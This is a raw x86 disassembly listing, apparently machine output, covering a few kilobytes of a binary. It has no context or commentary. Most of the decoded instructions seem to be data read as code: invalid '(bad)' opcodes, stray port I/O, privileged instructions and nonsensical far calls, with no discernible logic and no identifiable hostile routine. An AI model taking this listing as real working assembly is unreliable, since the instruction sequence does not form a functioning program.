  4a3ef0:	mov    ds:0x4334a34b,al
  4a3ef5:	dec    eax
  4a3ef6:	xor    ecx,DWORD PTR [esp+eiz*4+0x4c]
  4a3efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a3efb:	inc    ebx
  4a3efc:	dec    eax
  4a3efd:	xor    eax,DWORD PTR [ebp+ecx*2+0x33484da6]
  4a3f04:	test   BYTE PTR [edi+eiz*4],dh
  4a3f07:	dec    esi
  4a3f08:	test   al,0x33
  4a3f0a:	test   BYTE PTR [ebx+eax*2],dh
  4a3f0d:	dec    esi
  4a3f0e:	test   eax,0x4334844f
  4a3f13:	dec    eax
  4a3f14:	stos   BYTE PTR es:[edi],al
  4a3f15:	dec    edi
  4a3f16:	stos   DWORD PTR es:[edi],eax
  4a3f17:	xor    al,0x43
  4a3f19:	dec    eax
  4a3f1a:	xor    edx,DWORD PTR [eax-0x54]
  4a3f1d:	push   eax
  4a3f1e:	lods   eax,DWORD PTR ds:[esi]
  4a3f1f:	inc    ebx
  4a3f20:	dec    eax
  4a3f21:	xor    eax,DWORD PTR [ecx+edx*2+0x334851ae]
  4a3f28:	test   BYTE PTR [edi+ebp*4],dh
  4a3f2b:	push   edx
  4a3f2c:	mov    al,0x57
  4a3f2e:	mov    ds:0xb1524334,al
  4a3f33:	push   ebx
  4a3f34:	dec    eax
  4a3f35:	xor    eax,DWORD PTR [esp+esi*1+0x33b353b2]
  4a3f3c:	test   BYTE PTR [ebx+eax*2],dh
  4a3f3f:	push   esp
  4a3f40:	mov    ah,0x54
  4a3f42:	test   BYTE PTR [ebx+eax*2],dh
  4a3f45:	dec    eax
  4a3f46:	mov    ch,0x55
  4a3f48:	mov    dh,0xd0
  4a3f4a:	add    BYTE PTR [ecx+0x33],ah
  4a3f4d:	push   esi
  4a3f4e:	mov    bh,0xb
  4a3f50:	ins    DWORD PTR es:[edi],dx
  4a3f51:	sbb    esp,DWORD PTR [edx+0x49887742]
  4a3f57:	mov    eax,0x423a570d
  4a3f5c:	sub    al,BYTE PTR [ebx-0x38]
  4a3f5f:	mov    ecx,0x10caba90
  4a3f64:	repnz sbb al,0x14
  4a3f67:	pop    eax
  4a3f68:	mov    ebx,0x873c8498
  4a3f6d:	nop
  4a3f6e:	mov    esp,0xcfbd591c
  4a3f73:	and    DWORD PTR [edx+esi*1+0x5a24bea0],esp
  4a3f7a:	mov    edi,0x210ca908
  4a3f7f:	test   al,0xc0
  4a3f81:	sub    al,BYTE PTR [ebx-0x38]
  4a3f84:	jae    0x4a3fb2
  4a3f86:	pop    ebx
  4a3f87:	shl    DWORD PTR [eax+0x1cf210c2],0x42
  4a3f8e:	xor    al,0x5c
  4a3f90:	ret    
  4a3f91:	cmp    al,0x87
  4a3f93:	nop
  4a3f94:	retf   0xc4b8
  4a3f97:	cmp    al,0x5d
  4a3f99:	lds    esp,FWORD PTR [ecx]
  4a3f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3f9c:	xor    al,BYTE PTR [eax+eax*8+0x210ca9c6]
  4a3fa3:	iret   
  4a3fa4:	inc    esp
  4a3fa5:	pop    esi
  4a3fa6:	(bad)  
  4a3fa7:	enter  0x43c8,0xc8
  4a3fab:	jae    0x4a3fb5
  4a3fad:	dec    esp
  4a3fae:	pop    edi
  4a3faf:	leave  
  4a3fb0:	shl    dl,1
  4a3fb2:	sbb    al,0x42
  4a3fb4:	sub    cl,dl
  4a3fb6:	push   esp
  4a3fb7:	pusha  
  4a3fb8:	retf   
  4a3fb9:	xchg   DWORD PTR [eax-0x3327ef36],edx
  4a3fbf:	pop    esp
  4a3fc0:	popa   
  4a3fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3fc2:	xor    al,BYTE PTR [esp+edi*1+0xccee0cd]
  4a3fc9:	and    edi,ecx
  4a3fcb:	and    DWORD PTR [edx+eiz*2-0x31],esp
  4a3fcf:	call   0xa952b39c
  4a3fd4:	shr    BYTE PTR [ebx+eiz*2-0x2f],1
  4a3fd8:	sbb    al,0x42
  4a3fda:	sub    al,BYTE PTR [ebx-0x10]
  4a3fdd:	shl    BYTE PTR [esp+eiz*2-0x70],cl
  4a3fe1:	retf   0xf210
  4a3fe4:	sar    eax,cl
  4a3fe6:	aam    0x39
  4a3fe8:	test   BYTE PTR [edi+eax*4],bh
  4a3feb:	jl     0x4a4052
  4a3fed:	aad    0x0
  4a3fef:	and    WORD PTR [ebp-0x7b291bdf],dx
  4a3ff6:	xlat   BYTE PTR ds:[ebx]
  4a3ff7:	or     BYTE PTR gs:[ecx+0xe],bh
  4a3ffb:	or     BYTE PTR [edi-0x28],ah
  4a3ffe:	mov    WORD PTR [edx-0x62],es
  4a4001:	inc    ebx
  4a4002:	dec    eax
  4a4003:	fst    DWORD PTR [eax]
  4a4005:	push   0x5210e7da
  4a400a:	sbb    DWORD PTR [ebx+ebx*8+0x54846918],edx
  4a4011:	xchg   BYTE PTR [eax-0x6a226324],dl
  4a4017:	and    esp,esp
  4a4019:	cmp    DWORD PTR [eax],esp
  4a401b:	push   0xffffffde
  4a401d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a401e:	fisttp WORD PTR [eax]
  4a4020:	jns    0x4a4030
  4a4022:	and    DWORD PTR [eax],ebp
  4a4024:	imul   esp,eax,0xffffff9e
  4a4027:	inc    ebx
  4a4028:	dec    eax
  4a4029:	lods   al,BYTE PTR gs:[esi]
  4a402b:	loope  0x4a405d
  4a402d:	ins    BYTE PTR es:[edi],dx
  4a402e:	loop   0x4a4040
  4a4030:	push   edx
  4a4031:	sbb    DWORD PTR [edx-0x4c],eax
  4a4034:	jecxz  0x4a408a
  4a4036:	xchg   BYTE PTR [eax-0x1b92c719],dl
  4a403c:	mov    esp,0x39e421e5
  4a4041:	test   BYTE PTR [eax+0x6e],al
  4a4044:	out    0x79,al
  4a4046:	push   cs
  4a4047:	and    DWORD PTR [ebp+0x6f48e7c4],edx
  4a404d:	call   0x8af8895
  4a4052:	int3   
  4a4053:	jmp    0x426392a8
  4a4058:	sahf   
  4a4059:	jo     0x4a4045
  4a405b:	aam    0xeb
  4a405d:	xchg   BYTE PTR [eax+0x715810e7],dl
  4a4063:	in     al,dx
  4a4064:	fsubr  st(4),st
  4a4066:	cmp    DWORD PTR [esp+edx*2-0x118d9f13],eax
  4a406d:	push   cs
  4a406e:	and    DWORD PTR [ebp+0x68efe421],edx
  4a4074:	jae    0x4a40be
  4a4076:	or     BYTE PTR gs:[ecx-0x10],bh
  4a407a:	in     al,dx
  4a407b:	icebp  
  4a407c:	sbb    DWORD PTR [edx-0x62],eax
  4a407f:	inc    ebx
  4a4080:	jo     0x4a40f6
  4a4082:	repnz hlt 
  4a4084:	nop
  4a4085:	out    0x10,eax
  4a4087:	push   edx
  4a4088:	repz js 0x4a4100
  4a408b:	hlt    
  4a408c:	cmp    DWORD PTR [esp+edx*2-0x7f0a037a],eax
  4a4093:	jbe    0x4a40b6
  4a4095:	iret   
  4a4096:	and    esp,esp
  4a4098:	test   BYTE PTR [edi+esi*2],0xf7
  4a409c:	jae    0x4a40a6
  4a409e:	test   eax,0xcf8880c
  4a40a3:	js     0x4a40e7
  4a40a5:	sub    al,BYTE PTR [ebx-0x38]
  4a40a8:	stc    
  4a40a9:	nop
  4a40aa:	cli    
  4a40ab:	retf   0xf210
  4a40ae:	sbb    al,0x14
  4a40b0:	jns    0x4a40ad
  4a40b2:	cwde   
  4a40b3:	test   BYTE PTR [edi+eax*4],bh
  4a40b6:	nop
  4a40b7:	cld    
  4a40b8:	sbb    al,0x7a
  4a40ba:	std    
  4a40bb:	iret   
  4a40bc:	and    DWORD PTR [edx+esi*1+0x7b24fea0],esp
  4a40c3:	inc    DWORD PTR [ecx-0x57def354]
  4a40c9:	add    BYTE PTR [edx*4+0x2c79e421],cl
  4a40d0:	jl     0x4a40d3
  4a40d2:	mov    al,0x2
  4a40d4:	or     BYTE PTR [ecx+0xe],bh
  4a40d7:	and    DWORD PTR [edi*2+0x48439e03],esi
  4a40de:	gs mov eax,0x57e3c04
  4a40e4:	adc    BYTE PTR [edx+0x19],dl
  4a40e7:	inc    edx
  4a40e8:	rol    BYTE PTR [esi],0x54
  4a40eb:	xchg   BYTE PTR [eax+0x77f44e7],dl
  4a40f1:	enter  0x2108,0xe4
  4a40f5:	cmp    DWORD PTR [esp+ecx*2+0xe790980],eax
  4a40fc:	and    DWORD PTR [ebp-0x7eabf530],edx
  4a4102:	or     eax,DWORD PTR [ebx+0x48]
  4a4105:	gs or  al,bl
  4a4108:	or     al,0x5c
  4a410a:	push   edx
  4a410b:	sbb    DWORD PTR [edx-0x62],eax
  4a410e:	or     BYTE PTR ds:0x90860ee0,0xe7
  4a4115:	adc    BYTE PTR [ebx+eax*4+0xf],ah
  4a4119:	call   0x54ce7b02
  4a411e:	adc    BYTE PTR [esp+eax*4+0x11],ch
  4a4122:	push   cs
  4a4123:	and    DWORD PTR [ebp+0x7412f021],edx
  4a4129:	test   DWORD PTR [eax+0x65],ecx
  4a412c:	or     BYTE PTR [ecx+0x13],bh
  4a412f:	clc    
  4a4130:	adc    al,0x1c
  4a4132:	inc    edx
  4a4133:	sahf   
  4a4134:	inc    ebx
  4a4135:	jl     0x4a40bd
  4a4137:	adc    eax,0xca908700
  4a413c:	adc    dl,dh
  4a413e:	push   ss
  4a413f:	test   BYTE PTR [edi],dl
  4a4141:	xor    al,BYTE PTR [esp+edi*1+0x18880887]
  4a4148:	mov    WORD PTR [ecx],fs
  4a414a:	iret   
  4a414b:	and    DWORD PTR [ecx+ebx*1+0x731a8910],esp
  4a4152:	or     BYTE PTR [ecx+0x181b940c],ch
  4a4158:	mov    al,BYTE PTR [edx+0x2a]
  4a415b:	inc    ebx
  4a415c:	enter  0x9c1c,0x1d
  4a4160:	retf   0xf210
  4a4163:	sbb    al,0x20
  4a4165:	mov    ebx,DWORD PTR [esi]
  4a4167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4168:	test   BYTE PTR [edi+eax*4],bh
  4a416b:	nop
  4a416c:	pop    ds
  4a416d:	sub    BYTE PTR [eax+eiz*1+0x32a421cf],cl
  4a4174:	lods   al,BYTE PTR ds:[esi]
  4a4175:	and    DWORD PTR [eax],esi
  4a4177:	lea    esp,[edx]
  4a4179:	or     BYTE PTR [ecx+0x23b4210c],ch
  4a417f:	sub    al,BYTE PTR [ebx-0x38]
  4a4182:	jae    0x4a41bc
  4a4184:	mov    fs,WORD PTR [esp+edi*4]
  4a4187:	and    eax,0x421cf210
  4a418c:	inc    eax
  4a418d:	(bad)  
  4a418e:	es cmp al,0x87
  4a4191:	nop
  4a4192:	retf   0x27c4
  4a4195:	dec    eax
  4a4196:	nop
  4a4197:	sub    BYTE PTR [ecx],ah
  4a4199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a419a:	xor    al,BYTE PTR [esp+ecx*8+0x210ca929]
  4a41a1:	iret   
  4a41a2:	push   eax
  4a41a3:	xchg   ecx,eax
  4a41a4:	sub    dl,ah
  4a41a6:	sub    eax,DWORD PTR [ebx-0x38]
  4a41a9:	jae    0x4a41b3
  4a41ab:	pop    eax
  4a41ac:	xchg   edx,eax
  4a41ad:	sub    al,0xdc
  4a41af:	repnz sbb al,0x42
  4a41b2:	sub    ch,BYTE PTR ds:0x872e9360
  4a41b8:	nop
  4a41b9:	retf   0xe410
  4a41bc:	das    
  4a41bd:	push   0x8432a494
  4a41c2:	cmp    al,0x30
  4a41c4:	in     al,dx
  4a41c5:	xor    DWORD PTR [ecx+eiz*1],ecx
  4a41c8:	iret   
  4a41c9:	and    DWORD PTR [eax-0x6b],esi
  4a41cc:	xor    dh,ah
  4a41ce:	enter  0x873,0xa9
  4a41d2:	xor    edi,DWORD PTR [eax-0x6a]
  4a41d5:	xor    al,0x1c
  4a41d7:	inc    edx
  4a41d8:	sub    al,BYTE PTR [ebx-0x4]
  4a41db:	xor    eax,0xe7909780
  4a41e0:	adc    dl,dh
  4a41e2:	ss add al,0x98
  4a41e5:	aaa    
  4a41e6:	cmp    DWORD PTR [esp+edx*2+0xc388886],eax
  4a41ed:	cdq    
  4a41ee:	and    DWORD PTR [ebp-0x6fc61bdf],edx
  4a41f4:	cmp    ah,BYTE PTR [ebp+0x8]
  4a41f7:	jns    0x4a4207
  4a41f9:	adc    al,0x9a
  4a41fb:	cmp    ebx,DWORD PTR [eax+0x48439e42]
  4a4201:	cmp    al,0x1c
  4a4203:	fwait
  4a4204:	cmp    eax,0x195210e7
  4a4209:	mov    al,ds:0x269c243e
  4a420e:	push   esp
  4a420f:	xchg   BYTE PTR [eax-0xbf57c1],dl
  4a4215:	sbb    DWORD PTR [edx-0x66],eax
  4a4218:	and    DWORD PTR [ebp-0x65bd62bf],ebx
  4a421e:	and    DWORD PTR [edx+eax*2+0x219a439e],esp
  4a4225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4226:	sbb    DWORD PTR [esi+0x21459f44],ebx
  4a422c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a422d:	sbb    DWORD PTR [edx-0x61],eax
  4a4230:	inc    esi
  4a4231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4232:	sbb    DWORD PTR [edx-0x66],eax
  4a4235:	mov    al,ds:0x1948a047
  4a423a:	inc    edx
  4a423b:	call   0x9a42:0xa149a121
  4a4242:	and    DWORD PTR [edx+ecx*2+0x219a4ba2],esp
  4a4249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a424a:	sbb    DWORD PTR [edx+0x214da34c],esp
  4a4250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4251:	sbb    DWORD PTR [edx-0x5d],eax
  4a4254:	dec    esi
  4a4255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4256:	sbb    DWORD PTR [edx-0x66],eax
  4a4259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a425a:	dec    edi
  4a425b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a425c:	push   eax
  4a425d:	sbb    DWORD PTR [edx-0x66],eax
  4a4260:	and    DWORD PTR [ebp-0x65bd5aaf],esp
  4a4266:	and    DWORD PTR [edx+edx*2+0x219a53a6],esp
  4a426d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a426e:	sbb    DWORD PTR [esi+0x2155a754],esp
  4a4274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4275:	sbb    DWORD PTR [edx-0x58],eax
  4a4278:	push   esi
  4a4279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a427a:	sbb    DWORD PTR [edx-0x66],eax
  4a427d:	test   al,0x57
  4a427f:	test   eax,0x9a421958
  4a4284:	and    DWORD PTR [ecx-0x65bd55a7],ebp
  4a428a:	and    DWORD PTR [edx+ebx*2+0x219a5baa],esp
  4a4291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4292:	sbb    DWORD PTR [ebx+0x215dab5c],ebp
  4a4298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4299:	sbb    DWORD PTR [edx-0x54],eax
  4a429c:	pop    esi
  4a429d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a429e:	sbb    DWORD PTR [edx-0x66],eax
  4a42a1:	lods   al,BYTE PTR ds:[esi]
  4a42a2:	pop    edi
  4a42a3:	lods   eax,DWORD PTR ds:[esi]
  4a42a4:	pusha  
  4a42a5:	sbb    DWORD PTR [edx-0x66],eax
  4a42a8:	and    DWORD PTR [ebp-0x65bd519f],ebp
  4a42ae:	and    DWORD PTR [edx+eiz*2+0x219a63ae],esp
  4a42b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42b6:	sbb    DWORD PTR [edi+0x2165af64],ebp
  4a42bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42bd:	sbb    DWORD PTR [edx-0x50],eax
  4a42c0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42c2:	sbb    DWORD PTR [edx-0x66],eax
  4a42c5:	mov    al,0x67
  4a42c7:	mov    cl,0x68
  4a42c9:	sbb    DWORD PTR [edx-0x66],eax
  4a42cc:	and    DWORD PTR [ecx-0x65bd4d97],esi
  4a42d2:	and    DWORD PTR [edx+ebp*2+0x219a6bb2],esp
  4a42d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42da:	sbb    DWORD PTR [ebx+0x216db36c],esi
  4a42e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42e1:	sbb    DWORD PTR [edx-0x4c],eax
  4a42e4:	outs   dx,BYTE PTR ds:[esi]
  4a42e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42e6:	sbb    DWORD PTR [edx-0x66],eax
  4a42e9:	mov    ah,0x6f
  4a42eb:	mov    ch,0x70
  4a42ed:	sbb    DWORD PTR [edx-0x66],eax
  4a42f0:	and    DWORD PTR [ebp-0x65bd498f],esi
  4a42f6:	and    DWORD PTR [edx+esi*2+0x219a73b6],esp
  4a42fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a42fe:	sbb    DWORD PTR [edi+0x2175b774],esi
  4a4304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4305:	sbb    DWORD PTR [edx-0x48],eax
  4a4308:	jbe    0x4a42ae
  4a430a:	sbb    DWORD PTR [edx-0x66],eax
  4a430d:	mov    ecx,0x1978b977
  4a4312:	inc    edx
  4a4313:	call   0x9a42:0xba79ba21
  4a431a:	and    DWORD PTR [edx+edi*2+0x219a7bbb],esp
  4a4321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4322:	sbb    DWORD PTR [ebx+0x217dbc7c],edi
  4a4328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4329:	sbb    DWORD PTR [edx-0x44],eax
  4a432c:	jle    0x4a42d2
  4a432e:	sbb    DWORD PTR [edx-0x66],eax
  4a4331:	mov    ebp,0x1980bd7f
  4a4336:	inc    edx
  4a4337:	call   0x9a42:0xbe81be21
  4a433e:	and    DWORD PTR [edx+eax*4+0x219a83bf],esp
  4a4345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4346:	sbb    DWORD PTR [edi+0x2185c084],edi
  4a434c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a434d:	sbb    DWORD PTR [edx-0x40],eax
  4a4350:	xchg   BYTE PTR [ecx+ebx*1-0x783e65be],ah
  4a4357:	ror    DWORD PTR [eax+0x219a4219],0xc2
  4a435e:	mov    edx,eax
  4a4360:	inc    edx
  4a4361:	call   0x9a8b:0xc38aa421
  4a4368:	and    DWORD PTR [ecx+ebx*1-0x723b733d],esp
  4a436f:	and    DWORD PTR [ecx+ebx*1-0x5b713bbe],esp
  4a4376:	sbb    DWORD PTR [edx-0x66],eax
  4a4379:	lds    ecx,FWORD PTR [edi+0x421990c5]
  4a437f:	call   0x9a42:0xc691c621
  4a4386:	and    DWORD PTR [edx+edx*4+0x219a93c7],esp
  4a438d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a438e:	sbb    edi,eax
  4a4390:	xchg   esp,eax
  4a4391:	enter  0x2195,0xa4
  4a4395:	sbb    DWORD PTR [edx-0x37],eax
  4a4398:	xchg   esi,eax
  4a4399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a439a:	sbb    DWORD PTR [edx-0x66],eax
  4a439d:	leave  
  4a439e:	xchg   edi,eax
  4a439f:	retf   0x1998
  4a43a2:	inc    edx
  4a43a3:	call   0x9a42:0xcb99ca21
  4a43aa:	and    DWORD PTR [edx+ebx*4+0x219a9bcb],esp
  4a43b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a43b2:	sbb    esp,ecx
  4a43b4:	pushf  
  4a43b5:	int3   
  4a43b6:	popf   
  4a43b7:	and    DWORD PTR [ecx+ebx*1-0x5b6132be],esp
  4a43be:	sbb    DWORD PTR [edx-0x66],eax
  4a43c1:	int    0x9f
  4a43c3:	into   
  4a43c4:	mov    al,ds:0x219a4219
  4a43c9:	into   
  4a43ca:	mov    eax,ds:0x219a42cf
  4a43cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a43d0:	mov    ds:0x219aa3cf,al
  4a43d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a43d6:	sbb    eax,edx
  4a43d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a43d9:	shl    BYTE PTR [ebp+0x4219a421],1
  4a43df:	shl    DWORD PTR [esi-0x65bde65c],1
  4a43e5:	shl    DWORD PTR [edi+0x4219a8d2],1
  4a43eb:	call   0x9a42:0xd3a9d221
  4a43f2:	and    DWORD PTR [edx+ebp*4+0x219aabd3],esp
  4a43f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a43fa:	sbb    esp,edx
  4a43fc:	lods   al,BYTE PTR ds:[esi]
  4a43fd:	aam    0xad
  4a43ff:	and    DWORD PTR [ecx+ebx*1-0x5b512abe],esp
  4a4406:	sbb    DWORD PTR [edx-0x66],eax
  4a4409:	aad    0xaf
  4a440b:	(bad)  
  4a440c:	mov    al,0x19
  4a440e:	inc    edx
  4a440f:	call   0x9a42:0xd7b1d621
  4a4416:	and    DWORD PTR [edx+esi*4+0x219ab3d7],esp
  4a441d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a441e:	sbb    eax,ebx
  4a4420:	mov    ah,0xd8
  4a4422:	mov    ch,0x21
  4a4424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4425:	sbb    DWORD PTR [edx-0x27],eax
  4a4428:	mov    dh,0xa4
  4a442a:	sbb    DWORD PTR [edx-0x66],eax
  4a442d:	fidiv  DWORD PTR [edi+0x4219b8da]
  4a4433:	call   0x9a42:0xdbb9db21
  4a443a:	and    DWORD PTR [edx+edi*4+0x219abbdc],esp
  4a4441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4442:	sbb    esp,ebx
  4a4444:	mov    esp,0xa421bddd
  4a4449:	sbb    DWORD PTR [edx-0x23],eax
  4a444c:	mov    esi,0x9a4219a4
  4a4451:	fidivr WORD PTR [edi+0x4219c0de]
  4a4457:	call   0x9a42:0xdfc1df21
  4a445e:	and    DWORD PTR [edx+eax*8+0x219ac3e0],esp
  4a4465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4466:	sbb    eax,esp
  4a4468:	(bad)
  4a446c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a446d:	sbb    DWORD PTR [edx-0x1f],eax
  4a4470:	(bad)  
  4a4471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4472:	sbb    DWORD PTR [edx-0x66],eax
  4a4475:	loop   0x4a443e
  4a4477:	loop   0x4a4441
  4a4479:	sbb    DWORD PTR [edx-0x66],eax
  4a447c:	and    ebx,esp
  4a447e:	leave  
  4a447f:	jecxz  0x4a44c3
  4a4481:	call   0x9acb:0xe4caa421
  4a4488:	and    DWORD PTR [ecx+ebx*1-0x321a331c],esp
  4a448f:	and    DWORD PTR [ecx+ebx*1-0x5b311abe],esp
  4a4496:	sbb    DWORD PTR [edx-0x66],eax
  4a4499:	out    0xcf,al
  4a449b:	out    0xd0,al
  4a449d:	sbb    DWORD PTR [edx-0x66],eax
  4a44a0:	and    edi,esp
  4a44a2:	shl    edi,1
  4a44a4:	inc    edx
  4a44a5:	call   0x9ad3:0xe8d2a421
  4a44ac:	and    DWORD PTR [ecx+ebx*1-0x2a162b18],esp
  4a44b3:	and    DWORD PTR [ecx+ebx*1-0x5b2915be],esp
  4a44ba:	sbb    DWORD PTR [edx-0x66],eax
  4a44bd:	jmp    0x9a42:0x19d8ebd7
  4a44c4:	and    ebx,ebp
  4a44c6:	fldlg2 
  4a44c8:	inc    edx
  4a44c9:	call   0x9adb:0xecdaa421
  4a44d0:	and    DWORD PTR [ecx+ebx*1-0x22122313],esp
  4a44d7:	and    DWORD PTR [ecx+ebx*1-0x5b2111be],esp
  4a44de:	sbb    DWORD PTR [edx-0x66],eax
  4a44e1:	out    dx,al
  4a44e2:	fucomip st,st(7)
  4a44e4:	loopne 0x4a44ff
  4a44e6:	inc    edx
  4a44e7:	call   0x9a42:0xf0e1ef21
  4a44ee:	and    DWORD PTR [edx+eiz*8+0x219ae3f0],esp
  4a44f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a44f6:	sbb    ecx,esi
  4a44f8:	in     al,0xf1
  4a44fa:	in     eax,0x21
  4a44fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a44fd:	sbb    DWORD PTR [edx-0xe],eax
  4a4500:	out    0xa4,al
  4a4502:	sbb    DWORD PTR [edx-0x66],eax
  4a4505:	repnz out 0xf3,eax
  4a4508:	call   0x21e48726
  4a450d:	repz jmp 0x21e48807
  4a4513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4514:	jmp    0x19a4:0x219aebf4
  4a451b:	cmc    
  4a451c:	in     al,dx
  4a451d:	cmc    
  4a451e:	in     eax,dx
  4a451f:	and    DWORD PTR [ecx+ebx*1-0x5b1109be],esp
  4a4526:	sbb    DWORD PTR [edx-0x66],eax
  4a4529:	imul   bh
  4a452b:	div    eax
  4a452d:	sbb    DWORD PTR [edx-0x66],eax
  4a4530:	and    edi,esi
  4a4532:	icebp  
  4a4533:	clc    
  4a4534:	inc    edx
  4a4535:	call   0x9af3:0xf8f2a421
  4a453c:	and    DWORD PTR [ecx+ebx*1-0xa060b07],esp
  4a4543:	and    DWORD PTR [ecx+ebx*1-0x5b0905be],esp
  4a454a:	sbb    DWORD PTR [edx-0x66],eax
  4a454d:	sti    
  4a454e:	idiv   ebx
  4a4550:	clc    
  4a4551:	sbb    DWORD PTR [edx-0x66],eax
  4a4554:	and    esp,edi
  4a4556:	stc    
  4a4557:	cld    
  4a4558:	inc    edx
  4a4559:	call   0xb6fb:0xfdfaa421
  4a4560:	and    DWORD PTR [ecx+ebx*1+0x3afefcfd],esp
  4a4567:	push   0x195210fd
  4a456c:	inc    edx
  4a456d:	mov    al,ds:0x908656fe
  4a4572:	out    0x24,eax
  4a4574:	(bad)  
  4a4575:	jmp    FWORD PTR [eax+0x69200d00]
  4a457b:	mov    esi,0x4055f840
  4a4580:	add    DWORD PTR [esi],ecx
  4a4582:	xchg   edx,eax
  4a4583:	and    esp,0x2
  4a4586:	add    eax,DWORD PTR [esp+eiz*8]
  4a4589:	and    BYTE PTR [ecx],bh
  4a458b:	dec    eax
  4a458c:	add    eax,0x90879a06
  4a4591:	add    DWORD PTR [edi],0x2c
  4a4594:	add    BYTE PTR [edi+0x8],al
  4a4597:	adc    BYTE PTR [edx+0x19],dl
  4a459a:	inc    edx
  4a459b:	mov    al,0x9
  4a459d:	push   esp
  4a459e:	xchg   BYTE PTR [eax+0xa0134e7],dl
  4a45a4:	mov    eax,0x39e4210b
  4a45a9:	test   BYTE PTR [edx+eax*1],bh
  4a45ac:	or     al,0x79
  4a45ae:	push   cs
  4a45af:	and    DWORD PTR [ebp+0x3440dc0],edx
  4a45b5:	push   cs
  4a45b6:	inc    ebx
  4a45b7:	dec    eax
  4a45b8:	gs or  al,cl
  4a45bb:	cmovl  edx,DWORD PTR [edx+0x19]
  4a45bf:	inc    edx
  4a45c0:	sahf   
  4a45c1:	add    al,0x10
  4a45c3:	rcl    BYTE PTR [ecx],1
  4a45c5:	xchg   BYTE PTR [eax+0x55410e7],dl
  4a45cb:	adc    bl,al
  4a45cd:	loop   0x4a4608
  4a45cf:	test   BYTE PTR [ebx+edx*1+0x5c],dl
  4a45d3:	push   es
  4a45d4:	adc    al,0x24
  4a45d6:	pop    es
  4a45d7:	in     eax,dx
  4a45d8:	mov    al,ds:0x163b1547
  4a45dd:	pop    eax
  4a45de:	mov    BYTE PTR gs:0x18e0ef17,bl
  4a45e5:	cmp    esi,DWORD PTR [edx]
  4a45e7:	test   BYTE PTR [edi+eax*4],bh
  4a45ea:	fs pop es
  4a45ec:	sbb    eax,ebp
  4a45ee:	and    edi,ecx
  4a45f0:	and    DWORD PTR [edx+ebx*1+0x731b086c],esp
  4a45f7:	or     BYTE PTR [ecx+0x741cf00c],ch
  4a45fd:	or     DWORD PTR [edx+0x2a],eax
  4a4600:	inc    ebx
  4a4601:	enter  0xf81d,0x1e
  4a4605:	out    0x10,eax
  4a4607:	repnz sbb al,0x7c
  4a460a:	or     bl,BYTE PTR [edi]
  4a460c:	add    BYTE PTR [ebx],cl
  4a460e:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a4612:	and    BYTE PTR [ecx+eiz*1+0x39e42195],al
  4a4619:	or     BYTE PTR [edx+eiz*1],cl
  4a461c:	mov    WORD PTR [ebx],fs
  4a461e:	or     BYTE PTR [ecx+0xe],bh
  4a4621:	and    DWORD PTR [eax],edx
  4a4623:	or     eax,0x48439e24
  4a4628:	gs xchg esp,eax
  4a462a:	and    eax,0x10260e18
  4a462f:	push   edx
  4a4630:	sbb    DWORD PTR [edx-0x64],eax
  4a4633:	daa    
  4a4634:	push   esp
  4a4635:	xchg   BYTE PTR [eax+0x280f20e7],dl
  4a463b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a463c:	sub    DWORD PTR [ecx],esp
  4a463e:	in     al,0x39
  4a4640:	test   BYTE PTR [eax],ch
  4a4642:	adc    BYTE PTR [edx],ch
